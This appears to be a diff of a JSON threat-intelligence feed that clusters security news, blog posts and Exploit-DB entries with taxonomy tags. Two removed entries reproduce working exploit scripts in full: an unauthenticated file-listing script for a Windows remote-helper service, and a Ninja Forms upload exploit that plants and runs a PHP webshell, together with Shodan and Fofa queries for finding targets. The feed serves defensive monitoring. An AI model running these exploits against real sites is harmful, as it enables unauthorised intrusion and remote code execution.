           "Palo Alto Networks"
         ],
-        "cve_ids": [
-          "CVE-2026-0300"
-        ],
+        "cve_ids": [],
         "attack_techniques": [],
         "geographic_scope": [],
-        "urgency_signals": [
-          "preauth_unauth"
-        ],
+        "urgency_signals": [],
         "content_type": [
-          "vulnerability_disclosure"
+          "news_report"
         ],
         "confidence_tier": [
           "tier_4_news"
@@ -3738,33 +3564,20 @@
         "link": "https://thehackernews.com/2026/05/threatsday-bulletin-pan-os-rce-mythos.html",
         "published": "2026-05-14T16:07:46+00:00",
         "summary": "Everything is still on fire. This week feels dumb in the worst way — bad links, weak checks, fake help desks, shady forum posts, and people turning supply chain attacks into some cursed little game for clout and cash. Half of it feels new. Half of it feels like crap we should have fixed years ago. The mess keeps getting louder: users get tricked, boxes get popped, tools meant for normal work",
-        "full_body": "ThreatsDay Bulletin: PAN-OS RCE, Mythos cURL Bug, AI Tokenizer Attacks, and 10+ Stories  Ravie Lakshmanan  May 14, 2026 Hacking News / Cybersecurity News Everything is still on fire. This week feels dumb in the worst way — bad links, weak checks, fake help desks, shady forum posts, and people turning supply chain attacks into some cursed little game for clout and cash. Half of it feels new. Half of it feels like crap we should have fixed years ago. The mess keeps getting louder: users get tricked, boxes get popped, tools meant for normal work get used for bad stuff, and nobody seems shocked anymore. Great. Love that for us. Anyway. Let’s get into it. Exploited PAN-OS RCE Palo Alto Networks Releases Fixes for Exploited Flaw Palo Alto Networks has released the first round of fixes to address CVE-2026-0300 , a critical buffer overflow vulnerability in the User-ID Authentication Portal service of PAN-OS software that could allow an unauthenticated attacker to execute arbitrary code with root privileges by sending specially crafted packets. The company said it has observed the flaw being exploited in limited attacks since at least last month, with unknown threat actors leveraging it to drop payloads like EarthWorm and ReverseSocks5. Private AI chats Meta Announces Incognito Chat Meta has announced Incognito Chat with Meta AI in its namesake app and WhatsApp. Incognito Chat is \"a completely private way to interact with AI, similar to how end-to-end encryption means no one can read your conversations, even Meta or WhatsApp,\" CEO Mark Zuckerberg said. \"Incognito Chat handles all AI inference in a Trusted Execution Environment that ensures your messages are not accessible to us. The conversations on your phone also disappear when you exit the session.\" The feature is powered by Private Processing , which already underlies its message summarization and composition tools. Zero-auth data leak Defense Company Exposes Sensitive Data A defense technology company with Department of Defense contracts exposed user records and military training materials through API endpoints that lacked meaningful authorization checks. The issue affected Schemata, an AI-powered virtual training platform used in military and defense settings. According to Strix , an ordinary low-privilege account was able to access data across multiple tenants, including user listings, organization records, course information, training metadata, and direct links to documents hosted on Schemata’s Amazon Web Services instances. In a statement posted on the company’s website, Schemata said it did not have \"evidence that any third party exploited the vulnerability to access customer data.\" Router update reprieve FCC Softens Foreign Router Ban The U.S. Federal Communications Commission (FCC) has extended the deadline for owners of banned internet routers to provide security updates to U.S.-based users by two years. In March 2026, the FCC banned the import and sale of all \"consumer-grade\" internet routers produced in a foreign country, citing unacceptable national security risks. In a new public notice published last week, the Commission's Office of Engineering and Technology (OET) said it is extending this deadline until \"at least\" January 1, 2029. That said, the extension only applies to software and firmware updates so as to ensure the continued safety of already deployed routers in the U.S. and mitigate potential harm. \"These include all software and firmware updates to ensure the continued functionality of the devices, such as those that patch vulnerabilities and facilitate compatibility with different operating systems,\" per the FCC . APT phishing campaign Operation GriefLure Targets Vietnam and the Philippines A new state-sponsored threat cluster dubbed Operation GriefLure has been observed targeting Vietnam's telecom and the Philippines' healthcare sectors with a RAR archive distributed via spear-phishing emails to deploy a remote access trojan on compromised hosts, while le",
+        "full_body": "",
         "fetch_status": "ok",
         "taxonomy": {
-          "threat_categories": [
-            "vulnerability_disclosure",
-            "malware",
-            "phishing_social_eng",
-            "nation_state"
-          ],
+          "threat_categories": [],
           "actor_attribution": [],
-          "affected_industries": [
-            "healthcare",
-            "telecommunications"
-          ],
+          "affected_industries": [],
           "affected_products": [
-            "Palo Alto Networks",
-            "AWS"
+            "Palo Alto Networks"
           ],
-          "cve_ids": [
-            "CVE-2026-0300"
-          ],
+          "cve_ids": [],
           "attack_techniques": [],
           "geographic_scope": [],
-          "urgency_signals": [
-            "preauth_unauth"
-          ],
-          "content_type": "vulnerability_disclosure",
+          "urgency_signals": [],
+          "content_type": "news_report",
           "confidence_tier": "tier_4_news"
         }
       },
@@ -3777,30 +3590,17 @@
           "published": "2026-05-14T16:07:46+00:00",
           "summary": "Everything is still on fire. This week feels dumb in the worst way — bad links, weak checks, fake help desks, shady forum posts, and people turning supply chain attacks into some cursed little game for clout and cash. Half of it feels new. Half of it feels like crap we should have fixed years ago. The mess keeps getting louder: users get tricked, boxes get popped, tools meant for normal work",
           "taxonomy": {
-            "threat_categories": [
-              "vulnerability_disclosure",
-              "malware",
-              "phishing_social_eng",
-              "nation_state"
-            ],
+            "threat_categories": [],
             "actor_attribution": [],
-            "affected_industries": [
-              "healthcare",
-              "telecommunications"
-            ],
+            "affected_industries": [],
             "affected_products": [
-              "Palo Alto Networks",
-              "AWS"
+              "Palo Alto Networks"
             ],
-            "cve_ids": [
-              "CVE-2026-0300"
-            ],
+            "cve_ids": [],
             "attack_techniques": [],
             "geographic_scope": [],
-            "urgency_signals": [
-              "preauth_unauth"
-            ],
-            "content_type": "vulnerability_disclosure",
+            "urgency_signals": [],
+            "content_type": "news_report",
             "confidence_tier": "tier_4_news"
           }
         }
@@ -4251,170 +4051,6 @@
       ]
     },
     {
-      "cluster_id": "fd4f2336b4",
-      "priority_score": 13,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Microsoft Windows"
-        ],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [
-          "preauth_unauth"
-        ],
-        "content_type": [
-          "uncategorized"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Exploit-DB",
-        "cohort": "offensive_vulnerability_research",
-        "title": "[local] Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing",
-        "link": "https://www.exploit-db.com/exploits/52566",
-        "published": "2026-05-15T00:00:00+00:00",
-        "summary": "Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing EDB-ID: 52566 CVE: N/A EDB Verified: Author: Chokri Hammedi Type: local Exploit: / Platform: Windows Date: 2026-05-15 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing # Date: 2026-04-20 # Exploit Author: Chokri Hammedi # Software: https://rs.ltd/latest.php?os=win # Vendor: https://rs.ltd/ # Version: 2026.14 # Tested on: Windows 10 / Windows 11 import requests, json, sys, urllib3 from urllib.parse import quote urllib3.disable_warnings() if len(sys.argv) < 2: print(f\"Usage: {sys.argv[0]} <target_ip> [path]\") print(f\"Example: {sys.argv[0]} 192.168.1.103\") print(f\"Example: {sys.argv[0]} 192.168.1.103 'C:/Users'\") print(f\"Example: {sys.argv[0]} 192.168.1.103 '%USERPROFILE%/Desktop'\") sys.exit(1) target = sys.argv[1] path = sys.argv[2] if len(sys.argv) > 2 else \"\" url = f\"https://{target}:49762\" headers = {\"X-HostName\": \"a\", \"X-ClientToken\": \"a\", \"X-HostFullModel\": \"a\"} r = requests.get(f\"{url}/api/getVersion\", verify=False, timeout=5) data = r.json() if data.get(\"requires.auth\") == False: if path: encoded = quote(path, safe='') r = requests.get(f\"{url}/api/listFiles={encoded}\", headers=headers, verify=False) else: r = requests.get(f\"{url}/api/listFiles\", headers=headers, verify=False) print(json.dumps(r.json(), indent=2)) else: print(\"[*] Not vulnerable - authentication required\") Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "Microsoft Windows"
-          ],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [
-            "preauth_unauth"
-          ],
-          "content_type": "uncategorized",
-          "confidence_tier": "tier_1_offensive_research"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Exploit-DB",
-          "cohort": "offensive_vulnerability_research",
-          "title": "[local] Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing",
-          "link": "https://www.exploit-db.com/exploits/52566",
-          "published": "2026-05-15T00:00:00+00:00",
-          "summary": "Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Microsoft Windows"
-            ],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [
-              "preauth_unauth"
-            ],
-            "content_type": "uncategorized",
-            "confidence_tier": "tier_1_offensive_research"
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "f5e012a226",
-      "priority_score": 13,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "vulnerability_disclosure"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "cve_ids": [
-          "CVE-2026-0740"
-        ],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [
-          "preauth_unauth"
-        ],
-        "content_type": [
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Exploit-DB",
-        "cohort": "offensive_vulnerability_research",
-        "title": "[webapps] Ninja Forms Uploads - Unauthenticated PHP File Upload",
-        "link": "https://www.exploit-db.com/exploits/52560",
-        "published": "2026-05-13T00:00:00+00:00",
-        "summary": "Ninja Forms Uploads - Unauthenticated PHP File Upload",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Ninja Forms Uploads - Unauthenticated PHP File Upload EDB-ID: 52560 CVE: 2026-0740 EDB Verified: Author: selim.lanouar Type: webapps Exploit: / Platform: Multiple Date: 2026-05-13 Vulnerable App: # Exploit Title: Ninja Forms Uploads - Unauthenticated PHP File Upload # Date: 2026-04-09 # Exploit Author: Sélim Lanouar (@whattheslime) # Vendor Homepage: https://ninjaforms.com/ # Software Link: https://ninjaforms.com/extensions/file-uploads/ # Version: 3.3.24 # Tested on: WordPress (6.9.3) on Apache and Nginx servers # CVE: CVE-2026-0740 # Fofa Query: body=\"nfpluginsettings.js?ver=\" # Shodan Query: http.html:\"nfpluginsettings.js?ver=\" # ============================================================================= if [ \"$#\" -ne 1 ]; then echo \"Usage: $0 <target_url>\" exit 1 fi target=$1 field_id=$(head /dev/urandom | tr -dc '1-9' | head -c 16 ; echo) file_name=webshell.php echo \"[-] Writing webshell in /tmp/$file_name...\" echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/$file_name echo \"[-] Fetching nonce for random field_id $field_id...\" nonce=$(curl -s -X POST \"$target/wp-admin/admin-ajax.php\" \\ -d \"action=nf_fu_get_new_nonce&field_id=$field_id\" | jq -r '.data.nonce') echo \"[+] Got nf_fu_upload nonce: $nonce\" echo \"[-] Uploading webshell...\" response=$(curl -ks -X POST \"$target/wp-admin/admin-ajax.php\" \\ -F \"action=nf_fu_upload\" \\ -F \"nonce=$nonce\" \\ -F \"form_id=$field_id\" \\ -F \"field_id=$field_id\" \\ -F \"image_jpg=../../../$file_name\" \\ -F \"files-$field_id=@/tmp/$file_name;filename=image.jpg;type=image/jpeg\") echo \"[+] Upload response: $response\" command=\"curl -ks '$target/wp-content/$file_name?cmd=id'\" echo \"[-] Executing the 'id' command via the uploaded webshell: $command\" result=$(eval $command) echo \"[+] Command output: $result\" Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "vulnerability_disclosure"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "cve_ids": [
-            "CVE-2026-0740"
-          ],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [
-            "preauth_unauth"
-          ],
-          "content_type": "vulnerability_disclosure",
-          "confidence_tier": "tier_1_offensive_research"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Exploit-DB",
-          "cohort": "offensive_vulnerability_research",
-          "title": "[webapps] Ninja Forms Uploads - Unauthenticated PHP File Upload",
-          "link": "https://www.exploit-db.com/exploits/52560",
-          "published": "2026-05-13T00:00:00+00:00",
-          "summary": "Ninja Forms Uploads - Unauthenticated PHP File Upload",
-          "taxonomy": {
-            "threat_categories": [
-              "vulnerability_disclosure"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "cve_ids": [
-              "CVE-2026-0740"
-            ],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [
-              "preauth_unauth"
-            ],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_1_offensive_research"
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "c97972626b",
       "priority_score": 13,
       "member_count": 1,
@@ -4697,6 +4333,103 @@
       ]
     },
     {
+      "cluster_id": "4c42bf483b",
+      "priority_score": 12,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "active_exploitation",
+          "data_breach",
+          "ransomware"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "government_public_sector",
+          "telecommunications"
+        ],
+        "affected_products": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [
+          "cisa_kev",
+          "mass_exploitation"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research"
+        ]
+      },
+      "primary": {
+        "source": "Rapid7",
+        "cohort": "offensive_vulnerability_research",
+        "title": "How Rapid7 is bringing Cyber GRC closer to security operations",
+        "link": "https://www.rapid7.com/blog/post/cds-rapid7-cyber-grc-secops-compliance",
+        "published": "2026-05-12T13:17:51+00:00",
+        "summary": "Sabeen Malik is VP, Global Government Affairs and Public Policy at Rapid7. ⠀ Security teams need a better way to connect what they detect, what they fix, and what they can prove. The pace of modern security operations no longer works in defenders’ favor. IBM’s Cost of a Data Breach Report 2025 found that the mean time to identify and contain a breach is now 241 days, even as AI and automation help defenders move faster. At the same time, Rapid7’s 2026 Global Threat Landscape Report shows how quickly attacker behavior is compressing the response window: exploited high and critical severity vulnerabilities more than doubled year over year, increasing 105% from 71 in 2024 to 146 in 2025, while the median time from publication to CISA KEV inclusion fell from 8.5 days to 5.0 days. This is not a future risk. It is today’s operational reality. It also exposes a governance problem most security programs were not built to solve. Security teams are expected to demonstrate, continuously, that con",
+        "full_body": "Back to Blog Security Operations How Rapid7 is bringing Cyber GRC closer to security operations Sabeen Malik May 8, 2026 | Last updated on May 12, 2026 | xx min read DISCOVER RAPID7 MDR Sabeen Malik is VP, Global Government Affairs and Public Policy at Rapid7. ⠀ Security teams need a better way to connect what they detect, what they fix, and what they can prove. The pace of modern security operations no longer works in defenders’ favor. IBM’s Cost of a Data Breach Report 2025 found that the mean time to identify and contain a breach is now 241 days, even as AI and automation help defenders move faster. At the same time, Rapid7’s 2026 Global Threat Landscape Report shows how quickly attacker behavior is compressing the response window: exploited high and critical severity vulnerabilities more than doubled year over year, increasing 105% from 71 in 2024 to 146 in 2025, while the median time from publication to CISA KEV inclusion fell from 8.5 days to 5.0 days. This is not a future risk. It is today’s operational reality. It also exposes a governance problem most security programs were not built to solve. Security teams are expected to demonstrate, continuously, that controls are working, that risk is being reduced, and that security investments are delivering measurable outcomes. Point-in-time audit evidence, assembled quarterly, is structurally incompatible with an environment where the threat picture changes in minutes. The underlying issue is not a lack of effort, but a disconnect. Security data lives in one place, remediation happens in another, and evidence for auditors is assembled somewhere else. When leadership asks what changed, what was fixed, and what risk remains, teams are left stitching the story together manually producing reports that reflect where the organization was, not where it is. Cyber GRC closes that gap by bringing governance, risk management, and compliance closer to the security data and workflows teams already rely on. Why security operations and compliance need connected data For years, security operations and GRC have run in parallel. One team manages threats, exposures, and remediation. Another manages policies, controls, audits, and evidence. Both aim to reduce risk, but typically without shared context or shared data. That separation is no longer sustainable. Vulnerability exploitation rose 34% year-over-year and now accounts for 20% of all breaches, with a median of zero days between critical vulnerability publication and mass exploitation (Verizon DBIR 2025). Supply chain breaches doubled, now representing 30% of all incidents. Ransomware appeared in 44% of breaches – up 37% from the prior year. Security leaders operating in this environment face an expectation that compliance teams were not designed to meet alone: continuous proof that controls are effective against adversaries who operate at machine speed. When AI agents can autonomously chain every phase of an attack with minimal human oversight, a quarterly audit cycle is not an assurance, but a historical record. Why Cyber GRC matters now Boards are no longer satisfied with compliance status reports. They want dollarized risk scenarios and evidence that remediation is actually reducing exposure -- not just that it was attempted. Two pressures are converging. First, environmental complexity: modern infrastructure spans cloud, SaaS, remote endpoints, OT systems, and third-party providers. The perimeter is everywhere, and so is the attack surface. Second, regulatory expectation: SEC, NIS2, DORA, and CMMC now require demonstrable control effectiveness, not just documented policies. Both pressures demand a model that brings security activity, compliance readiness, and accountability into the same view. What Cyber GRC changes for security and compliance teams Cyber GRC changes how organizations use security data. Instead of disconnected, point-in-time artifacts, it enables teams to build governance and compliance workflows directly on top of rea",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware",
+            "data_breach",
+            "active_exploitation"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "government_public_sector",
+            "telecommunications"
+          ],
+          "affected_products": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [
+            "mass_exploitation",
+            "cisa_kev"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_offensive_research"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Rapid7",
+          "cohort": "offensive_vulnerability_research",
+          "title": "How Rapid7 is bringing Cyber GRC closer to security operations",
+          "link": "https://www.rapid7.com/blog/post/cds-rapid7-cyber-grc-secops-compliance",
+          "published": "2026-05-12T13:17:51+00:00",
+          "summary": "Sabeen Malik is VP, Global Government Affairs and Public Policy at Rapid7. ⠀ Security teams need a better way to connect what they detect, what they fix, and what they can prove. The pace of modern security operations no longer works in defenders’ favor. IBM’s Cost of a Data Breach Report 2025 found that the mean time to identify and contain a breach is now 241 days, even as AI and automation help defenders move faster. At the same time, Rapid7’s 2026 Global Threat Landscape Report shows how quickly attacker behavior is compressing the response window: exploited high and critical severity vulnerabilities more than doubled year over year, increasing 105% from 71 in 2024 to 146 in 2025, while the median time from publication to CISA KEV inclusion fell from 8.5 days to 5.0 days. This is not a future risk. It is today’s operational reality. It also exposes a governance problem most security programs were not built to solve. Security teams are expected to demonstrate, continuously, that con",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware",
+              "data_breach",
+              "active_exploitation"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "government_public_sector",
+              "telecommunications"
+            ],
+            "affected_products": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [
+              "mass_exploitation",
+              "cisa_kev"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_offensive_research"
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "12769a0a4d",
       "priority_score": 12,
       "member_count": 1,
@@ -4877,103 +4610,6 @@
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_2_operator"
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "4c42bf483b",
-      "priority_score": 12,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "active_exploitation",
-          "data_breach",
-          "ransomware"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "government_public_sector",
-          "telecommunications"
-        ],
-        "affected_products": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [
-          "cisa_kev",
-          "mass_exploitation"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Rapid7",
-        "cohort": "offensive_vulnerability_research",
-        "title": "How Rapid7 is bringing Cyber GRC closer to security operations",
-        "link": "https://www.rapid7.com/blog/post/cds-rapid7-cyber-grc-secops-compliance",
-        "published": "2026-05-12T13:17:51+00:00",
-        "summary": "Sabeen Malik is VP, Global Government Affairs and Public Policy at Rapid7. ⠀ Security teams need a better way to connect what they detect, what they fix, and what they can prove. The pace of modern security operations no longer works in defenders’ favor. IBM’s Cost of a Data Breach Report 2025 found that the mean time to identify and contain a breach is now 241 days, even as AI and automation help defenders move faster. At the same time, Rapid7’s 2026 Global Threat Landscape Report shows how quickly attacker behavior is compressing the response window: exploited high and critical severity vulnerabilities more than doubled year over year, increasing 105% from 71 in 2024 to 146 in 2025, while the median time from publication to CISA KEV inclusion fell from 8.5 days to 5.0 days. This is not a future risk. It is today’s operational reality. It also exposes a governance problem most security programs were not built to solve. Security teams are expected to demonstrate, continuously, that con",
-        "full_body": "Back to Blog Security Operations How Rapid7 is bringing Cyber GRC closer to security operations Sabeen Malik May 8, 2026 | Last updated on May 12, 2026 | xx min read DISCOVER RAPID7 MDR Sabeen Malik is VP, Global Government Affairs and Public Policy at Rapid7. ⠀ Security teams need a better way to connect what they detect, what they fix, and what they can prove. The pace of modern security operations no longer works in defenders’ favor. IBM’s Cost of a Data Breach Report 2025 found that the mean time to identify and contain a breach is now 241 days, even as AI and automation help defenders move faster. At the same time, Rapid7’s 2026 Global Threat Landscape Report shows how quickly attacker behavior is compressing the response window: exploited high and critical severity vulnerabilities more than doubled year over year, increasing 105% from 71 in 2024 to 146 in 2025, while the median time from publication to CISA KEV inclusion fell from 8.5 days to 5.0 days. This is not a future risk. It is today’s operational reality. It also exposes a governance problem most security programs were not built to solve. Security teams are expected to demonstrate, continuously, that controls are working, that risk is being reduced, and that security investments are delivering measurable outcomes. Point-in-time audit evidence, assembled quarterly, is structurally incompatible with an environment where the threat picture changes in minutes. The underlying issue is not a lack of effort, but a disconnect. Security data lives in one place, remediation happens in another, and evidence for auditors is assembled somewhere else. When leadership asks what changed, what was fixed, and what risk remains, teams are left stitching the story together manually producing reports that reflect where the organization was, not where it is. Cyber GRC closes that gap by bringing governance, risk management, and compliance closer to the security data and workflows teams already rely on. Why security operations and compliance need connected data For years, security operations and GRC have run in parallel. One team manages threats, exposures, and remediation. Another manages policies, controls, audits, and evidence. Both aim to reduce risk, but typically without shared context or shared data. That separation is no longer sustainable. Vulnerability exploitation rose 34% year-over-year and now accounts for 20% of all breaches, with a median of zero days between critical vulnerability publication and mass exploitation (Verizon DBIR 2025). Supply chain breaches doubled, now representing 30% of all incidents. Ransomware appeared in 44% of breaches – up 37% from the prior year. Security leaders operating in this environment face an expectation that compliance teams were not designed to meet alone: continuous proof that controls are effective against adversaries who operate at machine speed. When AI agents can autonomously chain every phase of an attack with minimal human oversight, a quarterly audit cycle is not an assurance, but a historical record. Why Cyber GRC matters now Boards are no longer satisfied with compliance status reports. They want dollarized risk scenarios and evidence that remediation is actually reducing exposure -- not just that it was attempted. Two pressures are converging. First, environmental complexity: modern infrastructure spans cloud, SaaS, remote endpoints, OT systems, and third-party providers. The perimeter is everywhere, and so is the attack surface. Second, regulatory expectation: SEC, NIS2, DORA, and CMMC now require demonstrable control effectiveness, not just documented policies. Both pressures demand a model that brings security activity, compliance readiness, and accountability into the same view. What Cyber GRC changes for security and compliance teams Cyber GRC changes how organizations use security data. Instead of disconnected, point-in-time artifacts, it enables teams to build governance and compliance workflows directly on top of rea",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware",
-            "data_breach",
-            "active_exploitation"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "government_public_sector",
-            "telecommunications"
-          ],
-          "affected_products": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [
-            "mass_exploitation",
-            "cisa_kev"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_offensive_research"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Rapid7",
-          "cohort": "offensive_vulnerability_research",
-          "title": "How Rapid7 is bringing Cyber GRC closer to security operations",
-          "link": "https://www.rapid7.com/blog/post/cds-rapid7-cyber-grc-secops-compliance",
-          "published": "2026-05-12T13:17:51+00:00",
-          "summary": "Sabeen Malik is VP, Global Government Affairs and Public Policy at Rapid7. ⠀ Security teams need a better way to connect what they detect, what they fix, and what they can prove. The pace of modern security operations no longer works in defenders’ favor. IBM’s Cost of a Data Breach Report 2025 found that the mean time to identify and contain a breach is now 241 days, even as AI and automation help defenders move faster. At the same time, Rapid7’s 2026 Global Threat Landscape Report shows how quickly attacker behavior is compressing the response window: exploited high and critical severity vulnerabilities more than doubled year over year, increasing 105% from 71 in 2024 to 146 in 2025, while the median time from publication to CISA KEV inclusion fell from 8.5 days to 5.0 days. This is not a future risk. It is today’s operational reality. It also exposes a governance problem most security programs were not built to solve. Security teams are expected to demonstrate, continuously, that con",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware",
-              "data_breach",
-              "active_exploitation"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "government_public_sector",
-              "telecommunications"
-            ],
-            "affected_products": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [
-              "mass_exploitation",
-              "cisa_kev"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_offensive_research"
           }
         }
       ]
@@ -5791,7 +5427,7 @@
         ]
       },
       "primary": {
-        "source": "Microsoft Threat Intelligence",
+        "source": "Microsoft Security Blog",
         "cohort": "threat_research_primary",
         "title": "Undermining the trust boundary: Investigating a stealthy intrusion through third-party compromise",
         "link": "https://www.microsoft.com/en-us/security/blog/2026/05/12/undermining-the-trust-boundary-investigating-a-stealthy-intrusion-through-third-party-compromise/",
@@ -5819,7 +5455,7 @@
       },
       "corroborating_sources": [
         {
-          "source": "Microsoft Threat Intelligence",
+          "source": "Microsoft Security Blog",
           "cohort": "threat_research_primary",
           "title": "Undermining the trust boundary: Investigating a stealthy intrusion through third-party compromise",
           "link": "https://www.microsoft.com/en-us/security/blog/2026/05/12/undermining-the-trust-boundary-investigating-a-stealthy-intrusion-through-third-party-compromise/",
@@ -5844,7 +5480,7 @@
           }
         },
         {
-          "source": "Microsoft Security Blog",
+          "source": "Microsoft Threat Intelligence",
           "cohort": "threat_research_primary",
           "title": "Undermining the trust boundary: Investigating a stealthy intrusion through third-party compromise",
           "link": "https://www.microsoft.com/en-us/security/blog/2026/05/12/undermining-the-trust-boundary-investigating-a-stealthy-intrusion-through-third-party-compromise/",
@@ -7088,9 +6724,93 @@
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [],
+        "threat_categories": [
+          "nation_state",
+          "ransomware"
+        ],
         "actor_attribution": [],
         "affected_industries": [],
+        "affected_products": [
+          "GitHub"
+        ],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [],
+        "content_type": [
+          "threat_research"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "SentinelOne Labs",
+        "cohort": "threat_research_primary",
+        "title": "LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout",
+        "link": "https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/",
+        "published": "2026-05-14T13:00:44+00:00",
+        "summary": "Mick Baccio and Scott Roberts examine whether public breach signals and market timing models can turn cyber incidents into actionable trading opportunities.",
